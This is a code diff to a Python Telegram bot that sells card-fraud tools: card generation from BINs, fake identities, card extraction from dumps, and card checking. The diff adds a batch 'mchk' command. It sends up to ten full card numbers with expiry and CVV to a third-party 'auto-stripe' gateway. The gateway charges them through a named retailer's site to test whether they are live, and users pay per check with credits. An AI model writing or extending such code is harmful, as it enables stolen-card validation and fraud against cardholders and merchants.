@@ -385,7 +385,6 @@ async def show_tools_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     tools_message = (
         "*✦ All Commands ✦*\n"
         "All commands are live, `Online`, and have `100%` health\\.\n"
-        "For MasterCard and Visa, different messages will be shown for prepaid bins\\.\n\n"
         "• `/gen <BIN>` \\- Generates 10 cards\n"
         "• `/fk <country>` \\- Generates fake info\n"
         "• `/fl <dump>` \\- Extracts cards from dumps\n"
@@ -393,7 +392,6 @@ async def show_tools_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "• `/bin <BIN>` \\- Performs BIN lookup\n"
         "• `/status` \\- Checks bot health\n"
         "• `/info` \\- Shows your info\n"
-        "• `/plans` \\- Shows subscription plans"
     )
     keyboard = [[InlineKeyboardButton("🔙 Back to Start", callback_data="back_to_start")]]
     reply_markup = InlineKeyboardMarkup(keyboard)
@@ -636,7 +634,7 @@ async def bin_lookup(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     user_info_box = (
         f"┣ ❏ *𝐑𝐞𝐪𝐮𝐞𝐬𝐭𝐞𝐝 𝐛𝐲* ➳ `{escaped_user}`\n"
-        f"┣ ❏ *𝐁𝐨𝐭 𝐛𝐲*       ➳ 『𝗥ᴏᴄ𝗸ʏ』\n"
+        f"┣ ❏ *𝐁𝐨𝐭 𝐛𝐲*       ➳ kคli liຖนxx\n"
         f"╰━━━━━━━━━━━━━━━━━━⬣"
     )
 
@@ -787,12 +785,208 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"✘ Country    ➜ {escape_markdown(country_name, version=2)}\n"
         "――――――――――――――――\n"
         f"✘ Request By  ➜ {escape_markdown(user.first_name, version=2)}\\[{escape_markdown(user_data.get('plan','Free'), version=2)}\\]\n"
-        "✘ Developer   ➜ @K4linuxx\n"
+        "✘ Developer   ➜ kคli liຖนxx\n"
         f"✘ Time        ➜ {escape_markdown(str(time_taken), version=2)} seconds\n"
         "――――――――――――――――"
     )
 
     await processing_msg.edit_text(final_text, parse_mode=ParseMode.MARKDOWN_V2)
+
+import time
+import aiohttp
+from telegram import Update
+from telegram.constants import ParseMode
+from telegram.helpers import escape_markdown
+from telegram.ext import ContextTypes
+
+# This function creates the stylish, bolded italic text using Unicode characters.
+# It is now used to format the card status response.
+def format_stylish_text(text):
+    """Converts text to a specific stylish, bolded italic Unicode font."""
+    unicode_map = {
+        'A': '𝘈', 'B': '𝘉', 'C': '𝘊', 'D': '𝘋', 'E': '𝘌', 'F': '𝘍', 'G': 'H',
+        'H': '𝘏', 'I': '𝘐', 'J': '𝘑', 'K': '𝘒', 'L': '𝘓', 'M': '𝘔', 'N': '𝘕',
+        'O': '𝘖', 'P': '𝘗', 'Q': '𝘲', 'R': '𝘙', 'S': '𝙎', 'T': '𝘛', 'U': '𝘜',
+        'V': '𝘝', 'W': '𝘞', 'X': '𝘟', 'Y': '𝘠', 'Z': '𝘡', 'a': '𝘢', 'b': '𝘣',
+        'c': '𝘤', 'd': '𝘥', 'e': '𝘦', 'f': '𝘧', 'g': '𝘨', 'h': '𝘩', 'i': '𝘪',
+        'j': '𝘫', 'k': '𝘬', 'l': '𝘭', 'm': '𝘮', 'n': '𝘯', 'o': '𝘰', 'p': '𝘱',
+        'q': '𝘲', 'r': '𝘳', 's': '𝘴', 't': '𝘵', 'u': '𝘶', 'v': '𝘷', 'w': '𝘸',
+        'x': '𝘹', 'y': '𝘺', 'z': '𝘻', ' ': ' '
+    }
+    formatted_text = ""
+    for char in text:
+        formatted_text += unicode_map.get(char, char)
+    return formatted_text
+
+async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Checks multiple cards on the same API with a detailed summary at the end."""
+
+    # Block private usage unless authorized
+    if update.effective_chat.type == "private":
+        if not await check_authorization(update, context):
+            return await update.effective_message.reply_text(
+                "❌ Private access is blocked.\n"
+                "Contact @YourOwnerUsername to buy subscription.",
+                parse_mode=None
+            )
+
+    user = update.effective_user
+    user_id = user.id
+
+    # Enforce cooldown for batch command
+    if not await enforce_cooldown(user_id, update):
+        return
+
+    # Parse card input, limited to 10 cards
+    if not context.args:
+        return await update.effective_message.reply_text(
+            "Usage: /mchk number|mm|yy|cvv",
+            parse_mode=None
+        )
+
+    raw_cards = ' '.join(context.args)
+    card_lines = [line.strip() for line in raw_cards.splitlines() if line.strip()]
+    
+    if not card_lines:
+        return await update.effective_message.reply_text(
+            "Invalid format. Please provide at least one card on a separate line.",
+            parse_mode=None
+        )
+        
+    cards_to_check = card_lines[:10]  # Limit to max 10 cards
+    total_cards = len(cards_to_check)
+    
+    # Initialize counters for the summary
+    approved_count = 0
+    declined_count = 0
+    error_count = 0
+    checked_count = 0
+    
+    # Send initial message with a processing header
+    processing_text = "Processing..."
+    processing_msg = await update.effective_message.reply_text(processing_text, parse_mode=None)
+    
+    start_time = time.time()
+    results = []
+    
+    # Loop through and process each card
+    for i, raw in enumerate(cards_to_check):
+        # Load user data and check for credits
+        user_data = await get_user(user_id)
+        if user_data.get('credits', 0) <= 0:
+            results.append("❌ Out of credits.")
+            error_count += 1
+            break
+            
+        parts = raw.split("|")
+        if len(parts) != 4:
+            results.append(f"❌ Invalid format for card {raw}.")
+            error_count += 1
+            checked_count += 1
+            continue
+
+        # Normalize year to 2 digits
+        if len(parts[2]) == 4:
+            parts[2] = parts[2][-2:]
+        cc_normalized = "|".join(parts)
+
+        # BIN lookup
+        bin_number = parts[0][:6]
+        bin_details = await get_bin_details(bin_number)
+        if bin_details is None:
+            bin_details = {}
+        brand = (bin_details.get("scheme") or "N/A").upper()
+        issuer = (bin_details.get("type") or "N/A").upper()
+        country_name = (bin_details.get("country_name") or "N/A").upper()
+
+        # Deduct credit
+        if not await consume_credit(user_id):
+            results.append(f"❌ Failed to deduct credit for card {raw}.")
+            error_count += 1
+            break
+        
+        # Darkboy API call
+        api_url = f"https://darkboy-auto-stripe.onrender.com/gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc={cc_normalized}"
+        try:
+            async with aiohttp.ClientSession() as session:
+                async with session.get(api_url, timeout=25) as resp:
+                    if resp.status != 200:
+                        raise Exception(f"HTTP {resp.status}")
+                    data = await resp.json()
+        except Exception as e:
+            results.append(f"❌ API Error for cards {raw}: {str(e)}")
+            error_count += 1
+            checked_count += 1
+            
+            # Update the message with the current progress
+            current_time_taken = round(time.time() - start_time, 2)
+            current_summary = (
+                f"✧ 𝐓𝐨𝐭𝐚𝐥↣{total_cards}\n"
+                f"✧ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝↣{checked_count}\n"
+                f"✧ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝↣{approved_count}\n"
+                f"✧ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝↣{declined_count}\n"
+                f"✧ 𝐄𝐫𝐫𝐨𝐫𝐬↣{error_count}\n"
+                f"✧ 𝐓𝐢𝐦𝐞↣{current_time_taken} 𝐒\n"
+                f"\n𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸\n"
+                f"──────── ⸙ ─────────"
+            )
+            current_results = "\n──────── ⸙ ─────────\n".join(results)
+            await processing_msg.edit_text(current_summary + "\n\n" + current_results, parse_mode=None)
+
+            continue
+
+        api_status = (data.get("status") or "Unknown").title()
+        api_response = data.get("response") or "N/A"
+
+        # Update counters
+        if api_status.lower() == "approved":
+            approved_count += 1
+        elif api_status.lower() == "declined":
+            declined_count += 1
+        else:
+            error_count += 1
+        checked_count += 1
+        
+        # The response is now formatted with the stylish font.
+        formatted_response = format_stylish_text(api_response)
+
+        card_result = (
+            f"{cc_normalized}\n"
+            f"𝐒𝐭𝐚𝐭𝐮𝐬➳ {formatted_response}"
+        )
+        results.append(card_result)
+        
+        # Update the message with the current progress
+        current_time_taken = round(time.time() - start_time, 2)
+        current_summary = (
+            f"✧ 𝐓𝐨𝐭𝐚𝐥↣{total_cards}\n"
+            f"✧ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝↣{checked_count}\n"
+            f"✧ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝↣{approved_count}\n"
+            f"✧ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝↣{declined_count}\n"
+            f"✧ 𝐄𝐫𝐫𝐨𝐫𝐬↣{error_count}\n"
+            f"✧ 𝐓𝐢𝐦𝐞↣{current_time_taken} 𝐒\n"
+            f"\n𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸\n"
+            f"──────── ⸙ ─────────"
+        )
+        current_results_str = "\n──────── ⸙ ─────────\n".join(results)
+        await processing_msg.edit_text(current_summary + "\n\n" + current_results_str, parse_mode=None)
+
+    # Final update after all cards are processed
+    final_time_taken = round(time.time() - start_time, 2)
+    final_summary = (
+        f"✧ 𝐓𝐨𝐭𝐚𝐥↣{total_cards}\n"
+        f"✧ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝↣{checked_count}\n"
+        f"✧ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝↣{approved_count}\n"
+        f"✧ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝↣{declined_count}\n"
+        f"✧ 𝐄𝐫𝐫𝐨𝐫𝐬↣{error_count}\n"
+        f"✧ 𝐓𝐢𝐦𝐞↣{final_time_taken} 𝐒"
+        f"\n\n𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸\n"
+        f"──────── ⸙ ─────────"
+    )
+    
+    final_text = final_summary + "\n\n" + "\n──────── ⸙ ─────────\n".join(results) + "\n──────── ⸙ ─────────"
+    await processing_msg.edit_text(final_text, parse_mode=None)
+
 
 
 
@@ -1552,6 +1746,7 @@ def main():
     application.add_handler(CommandHandler("gen", gen))
     application.add_handler(CommandHandler("bin", bin_lookup))
     application.add_handler(CommandHandler("chk", chk_command))
+    application.add_handler(CommandHandler("mchk", mchk_command))
     application.add_handler(CommandHandler("fk", fk_command))
     application.add_handler(CommandHandler("fl", fl_command))
     application.add_handler(CommandHandler("status", status_command))
